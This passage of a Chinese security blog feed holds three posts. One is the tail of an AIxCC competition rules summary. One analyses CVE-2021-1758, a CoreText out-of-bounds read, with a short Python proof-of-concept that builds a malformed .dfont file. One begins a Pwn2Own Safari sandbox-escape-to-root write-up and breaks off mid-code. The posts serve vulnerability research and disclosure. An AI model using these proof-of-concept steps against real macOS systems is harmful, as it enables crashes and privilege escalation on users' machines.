提供代码库和引入漏洞的单个diff文件。代码库包含初始模糊测试工具，diff文件则为CRS提供识别和修补漏洞的额外起点。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;全扫描挑战&lt;/strong&gt;&lt;br&gt;
呈现已包含漏洞的扁平化代码库。没有diff文件作为起点，CRS必须仅依靠模糊测试工具对代码库进行全面分析。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;SARIF广播挑战&lt;/strong&gt;&lt;br&gt;
提供SARIF格式的静态分析警报（可能为真阳性或假阳性）。CRS需评估警报是否代表真实漏洞，并可选择提供补丁。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;这种多样化至关重要，因为现实漏洞可能通过代码审查、静态分析工具、模糊测试和运行时监控等多种渠道发现。能处理所有这些输入的系统在实际安全环境中将更具价值。&lt;/p&gt;
&lt;h2 id=&#34;支持自定义ai模型开发&#34;&gt;支持自定义AI模型开发
&lt;/h2&gt;&lt;p&gt;这项赛事政策的最大变革是DARPA现在允许使用自定义AI/ML模型。半决赛中系统仅能使用Anthropic、OpenAI和Google的第三方模型。现在参赛者可开发部署自己的专用模型（需通过竞赛审核且可复现）。&lt;/p&gt;
&lt;p&gt;团队现在能够：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;微调专门用于安全漏洞检测的模型&lt;/li&gt;
&lt;li&gt;为漏洞分析的不同环节创建专用模型&lt;/li&gt;
&lt;li&gt;开发轻量级高效模型处理重复性任务&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;为确保公平竞争仍有限制：自定义模型不能预训练记忆开源软件历史漏洞信息。这防止团队简单教授模型已知问题，确保系统展示真正的推理能力。&lt;/p&gt;
&lt;h2 id=&#34;弹性计算资源配置&#34;&gt;弹性计算资源配置
&lt;/h2&gt;&lt;p&gt;另一重大技术转变是赋予参赛者基础设施的直接控制权。团队现在获得Azure订阅，仅受轮次计算预算约束，而非半决赛的固定计算资源分配。&lt;/p&gt;
&lt;p&gt;这意味着团队能基于每项挑战的独特需求制定资源分配策略：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;为计算密集型模糊测试分配更强硬件&lt;/li&gt;
&lt;li&gt;为运行自定义AI模型配置昂贵GPU实例&lt;/li&gt;
&lt;li&gt;根据挑战复杂度动态扩展资源&lt;/li&gt;
&lt;li&gt;并行运行多个分析管道&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这种弹性让团队能在不计分轮次试验不同分配策略，确定哪种方案最适合各类挑战。&lt;/p&gt;
&lt;h2 id=&#34;评分算法革新&#34;&gt;评分算法革新
&lt;/h2&gt;&lt;p&gt;AIxCC决赛保留&amp;quot;补丁价值远高于单纯漏洞发现&amp;quot;的核心评分原则，但新增维度：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;新增得分机会&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;SARIF分类：正确标记静态分析警报的真/假阳性&lt;/li&gt;
&lt;li&gt;捆绑提交：将SARIF广播与漏洞和补丁关联&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;新评分修正项&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;早鸟奖励：越早提交得分越高&lt;/li&gt;
&lt;li&gt;跨团队验证：补丁必须能抵御所有团队发现的崩溃输入才能得分&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些改变激励团队构建能快速通过不同方法发现漏洞的系统，并创建真正解决漏洞根源而非过滤特定崩溃输入的补丁。&lt;/p&gt;
&lt;h2 id=&#34;buttercup的下一步&#34;&gt;Buttercup的下一步
&lt;/h2&gt;&lt;p&gt;Buttercup 2.0正在参与展示赛，团队利用反馈优化方案。我们的工作将在6月下旬的决赛轮达到高潮，结果于8月DEF CON 2025公布。这项赛事诞生的系统将代表自动化漏洞发现与修复领域的重大飞跃。&lt;/p&gt;
&lt;p&gt;敬请关注Buttercup在AIxCC决赛中的更多进展！&lt;/p&gt;
&lt;p&gt;&lt;em&gt;免责声明：本文涉及的AIxCC规则、评分指南、基础设施和活动信息可能变更。本文非权威文档，请以DARPA官网和官方文件为准。&lt;/em&gt;&lt;/p&gt;
</description>
        </item>
        <item>
        <title>深入解析CVE-2021-1758（CoreText越界读取漏洞）</title>
        <link>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cve-2021-1758coretext%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</link>
        <pubDate>Sun, 03 Aug 2025 00:08:04 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90cve-2021-1758coretext%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</guid>
        <description>&lt;h1 id=&#34;cve-2021-1758coretext越界读取分析&#34;&gt;CVE-2021-1758（CoreText越界读取）分析
&lt;/h1&gt;&lt;h2 id=&#34;mac资源派生字体文件&#34;&gt;Mac资源派生字体文件
&lt;/h2&gt;&lt;h3 id=&#34;资源派生结构&#34;&gt;资源派生结构
&lt;/h3&gt;&lt;p&gt;现代macOS系统可以加载称为Mac资源派生（Resource Fork）的字体文件。这种遗留结构包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;资源头&lt;/strong&gt;（16字节）：记录数据偏移/大小&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源数据&lt;/strong&gt;：多个资源条目（4字节长度+可变数据）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;资源映射表&lt;/strong&gt;：包含类型列表、引用列表和名称列表&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;关键数据结构&#34;&gt;关键数据结构
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 示例资源头结构&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;res_header&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data_offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map_offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p32&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;map_len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 资源类型列表项&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;type_entry&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;FOND&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_count&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ref_list_offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;目标分析&#34;&gt;目标分析
&lt;/h2&gt;&lt;h3 id=&#34;测试环境搭建&#34;&gt;测试环境搭建
&lt;/h3&gt;&lt;p&gt;使用CoreText框架的测试工具：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-objectivec&#34; data-lang=&#34;objectivec&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;CFArrayRef&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;descriptors&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;CTFontManagerCreateFontDescriptorsFromURL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;覆盖率分析&#34;&gt;覆盖率分析
&lt;/h3&gt;&lt;p&gt;通过TinyInst获取执行路径：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo litecov -instrument_module libFontParser.dylib -- ./main font.dfont
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Arial字体：719个基本块&lt;/li&gt;
&lt;li&gt;自定义字体：557-629个基本块（逐步修正结构后）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;漏洞细节&#34;&gt;漏洞细节
&lt;/h2&gt;&lt;h3 id=&#34;触发路径&#34;&gt;触发路径
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;绕过&lt;code&gt;CheckMapHeaderCommon&lt;/code&gt;的字节序检查：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;res_map_offset&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;_byteswap_ulong&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 需大端序
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;操纵资源类型数量使&lt;code&gt;CheckMapCommon&lt;/code&gt;提前返回：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;num_types&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 通过设置0xFFFF触发
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;在&lt;code&gt;GetResourcePtrCommon&lt;/code&gt;中触发OOB读取：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;memmove&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;res_name_entry&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;name_len&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 未验证的偏移量
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;poc构造&#34;&gt;PoC构造
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 关键恶意结构&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;res_map&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0xffff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 欺骗类型检查&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;res_map&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x6000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# 可控的OOB偏移&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;with&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;exp.dfont&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;wb&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;as&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pad&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;res_map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;参考&#34;&gt;参考
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://starlabs.sg/advisories/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;STAR Labs安全公告STAR-21-1758&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;macOS 10.15.4 (19E287)验证受影响&lt;/li&gt;
&lt;li&gt;字体解析器未正确处理资源映射表验证&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>Pwn2Own Safari沙箱逃逸第一部分：获取root shell的技术分析</title>
        <link>http://localhost:1313/p/pwn2own-safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%8E%B7%E5%8F%96root-shell%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 23:56:55 +0800</pubDate>
        
        <guid>http://localhost:1313/p/pwn2own-safari%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86%E8%8E%B7%E5%8F%96root-shell%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;pwn2own-safari沙箱逃逸第一部分---获取root-shell&#34;&gt;Pwn2Own: Safari沙箱逃逸第一部分 - 获取root shell
&lt;/h1&gt;&lt;p&gt;今天我们将介绍CVE-2017-2533/ZDI-17-357漏洞，这是macOS系统服务中的一个竞争条件漏洞，可用于从本地管理员权限提升至root权限。我们在今年的Pwn2Own比赛中结合其他逻辑漏洞利用它来逃逸Safari沙箱。&lt;/p&gt;
&lt;p&gt;该漏洞存在于Disk Arbitration守护进程(diskarbitrationd)中，该进程负责管理macOS上的块设备。其IPC接口可以从Safari沙箱内部访问，这使其成为我们感兴趣的目标。通过利用此漏洞，我们可以将磁盘分区挂载到任何不受SIP保护的目录上。由于每台新款MacBook都有一个允许默认用户写入的小型FAT32恢复分区，这使我们能够将任意内容的文件放入文件系统并获得root权限。&lt;/p&gt;
&lt;h2 id=&#34;漏洞发现&#34;&gt;漏洞发现
&lt;/h2&gt;&lt;p&gt;在Safari渲染器中实现代码执行后，我们的目标是横向移动到更高权限的系统进程，因此我们通过查看允许的mach查找列表(即可以通过mach IPC通信的服务)开始审计。该列表可以在沙箱规则文件&lt;code&gt;/System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebProcess.sb&lt;/code&gt;中找到。&lt;/p&gt;
&lt;p&gt;列表中的第一个服务&lt;code&gt;com.apple.DiskArbitration.diskarbitrationd&lt;/code&gt;立即引起了我们的注意。Disk Arbitration是Apple负责管理(主要是挂载和卸载)块设备的框架，diskarbitrationd是处理相应IPC请求的服务。为什么浏览器渲染器需要挂载磁盘？这绝对值得进一步调查。&lt;/p&gt;
&lt;h2 id=&#34;漏洞分析&#34;&gt;漏洞分析
&lt;/h2&gt;&lt;p&gt;我们发现漏洞存在于DARequest.c文件的以下代码中：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DADiskGetDescription&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;disk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kDADiskDescriptionVolumePathKey&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;NULL&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;DARequestGetUserUID&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;request&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;CFTypeRef&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;mountpoint&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
